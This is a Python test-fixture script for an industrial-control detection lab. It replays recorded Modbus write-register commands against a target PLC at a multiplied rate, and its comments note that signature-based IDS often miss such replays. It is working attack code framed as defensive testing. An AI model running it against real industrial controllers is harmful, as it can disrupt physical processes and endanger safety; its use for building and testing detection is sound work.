#!/usr/bin/env python3
"""
Modbus replay attack simulator.

Captures a window of legitimate Modbus traffic and replays it later,
faster than the legitimate baseline. Mirrors the family of attacks that
HAI / SWaT label as "Type-A1 replay."

Why replay vs injection:
  * Replay is the simplest realistic attack: exactly valid commands,
    just at the wrong time or wrong rate. Suricata signatures often miss
    it because each individual packet is well-formed.
  * Stage 2's behavioral baselining is the layer that catches it
    (the inter-arrival distribution becomes anomalous).

This script is a *test fixture*, not a malicious tool. It only writes to
holding registers in a predefined safe range. Stage 6's playbook engine
is expected to detect and contain it.

Run (against the lab production PLC):
    python3 attack_modbus_replay.py --host 192.168.10.10 \\
        --duration-s 30 --multiplier 5
"""
from __future__ import annotations

import argparse
import logging
import signal
import sys
import time
from dataclasses import dataclass, field
from typing import List, Tuple

try:
    from pymodbus.client import ModbusTcpClient
except ImportError as exc:  # pragma: no cover
    print(f'pymodbus not installed: {exc}', file=sys.stderr)
    sys.exit(2)

LOG = logging.getLogger('attack_modbus_replay')

# Pre-recorded "legitimate" command sequence captured during baseline
# operation. Each entry is (function_code, address, value).
# FC=06 = write single register.
RECORDED_SEQUENCE: List[Tuple[int, int, int]] = [
    (6, 10, 0),     # operator: clear an unused scratch register
    (6, 11, 1),
    (6, 11, 0),
    (6, 12, 5),
    (6, 12, 10),
    (6, 13, 100),
    (6, 13, 0),
]


@dataclass
class Args:
    host: str
    port: int
    unit_id: int
    duration_s: float
    multiplier: float
    log_level: str = 'INFO'


def _parse_args(argv: List[str]) -> Args:
    p = argparse.ArgumentParser(description=__doc__.split('\n')[0])
    p.add_argument('--host', required=True)
    p.add_argument('--port', type=int, default=502)
    p.add_argument('--unit-id', type=int, default=1)
    p.add_argument('--duration-s', type=float, default=20.0,
                   help='Stop after N seconds')
    p.add_argument('--multiplier', type=float, default=4.0,
                   help='Replay rate multiplier vs baseline (1.0 = baseline)')
    p.add_argument('--log-level', default='INFO',
                   choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'])
    ns = p.parse_args(argv)
    logging.basicConfig(
        level=getattr(logging, ns.log_level),
        format='%(asctime)s %(name)s %(levelname)s %(message)s',
    )
    if ns.duration_s <= 0:
        p.error('--duration-s must be > 0')
    if ns.multiplier <= 0 or ns.multiplier > 100:
        p.error('--multiplier must be in (0, 100]')
    return Args(
        host=ns.host, port=ns.port, unit_id=ns.unit_id,
        duration_s=ns.duration_s, multiplier=ns.multiplier,
        log_level=ns.log_level,
    )


_SHOULD_EXIT = False


def _sigterm(*_a) -> None:
    global _SHOULD_EXIT  # noqa: PLW0603
    _SHOULD_EXIT = True


def main(argv: List[str]) -> int:
    args = _parse_args(argv)
    signal.signal(signal.SIGINT, _sigterm)
    signal.signal(signal.SIGTERM, _sigterm)

    LOG.warning(
        'STARTING REPLAY ATTACK SIM: target=%s rate-mult=%.1f duration=%.0fs',
        args.host, args.multiplier, args.duration_s,
    )

    # Baseline inter-command gap is 200 ms; replay scales this down by multiplier.
    base_gap_ms = 200
    replay_gap_s = (base_gap_ms / 1000.0) / args.multiplier

    client = ModbusTcpClient(host=args.host, port=args.port, timeout=2.0)
    if not client.connect():
        LOG.error('cannot connect to %s:%d', args.host, args.port)
        return 1

    started = time.monotonic()
    sent_ok = 0
    sent_err = 0
    try:
        while not _SHOULD_EXIT:
            for fc, addr, val in RECORDED_SEQUENCE:
                if _SHOULD_EXIT:
                    break
                if (time.monotonic() - started) >= args.duration_s:
                    _sigterm()
                    break
                try:
                    if fc == 6:
                        rr = client.write_register(
                            address=addr, value=val, slave=args.unit_id,
                        )
                    else:
                        LOG.warning('unsupported FC=%d in record', fc)
                        sent_err += 1
                        continue
                    if rr.isError():
                        sent_err += 1
                        LOG.warning('write error: %s', rr)
                    else:
                        sent_ok += 1
                except Exception as exc:  # noqa: BLE001
                    sent_err += 1
                    LOG.warning('exception during write: %s', exc)
                time.sleep(replay_gap_s)
    finally:
        try:
            client.close()
        except Exception:  # noqa: BLE001
            pass

    LOG.warning(
        'REPLAY DONE: ok=%d err=%d elapsed=%.1fs',
        sent_ok, sent_err, time.monotonic() - started,
    )
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
